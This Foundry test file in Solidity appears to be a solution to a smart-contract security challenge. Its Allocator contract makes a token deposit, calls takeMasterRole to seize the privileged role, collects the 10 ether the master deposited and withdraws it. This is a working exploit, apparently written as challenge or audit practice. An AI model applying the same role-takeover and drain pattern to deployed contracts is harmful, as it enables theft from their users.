// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;


import "forge-std/Test.sol";
import "../src/Allocations.sol";

contract AllocationsTest is Test {
    Allocations public allocations;

    address master = makeAddr("master");
    address me = makeAddr("ceseshi");

    function setUp() public {
        allocations = new Allocations();

        deal(master, 10 ether);
        vm.startPrank(master);
        allocations.allocate{value: 10 ether}();
    }

    function testAllocations() public {
        vm.startPrank(me);
        Allocator allocator = new Allocator();
        allocator.attack(address(allocations));
        allocator.withdraw();
    }
}

contract Allocator {

    function attack(address _allocations) public payable {
        Allocations(_allocations).allocate{value: msg.value}();
        Allocations(_allocations).takeMasterRole();
        Allocations(_allocations).collectAllocations();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
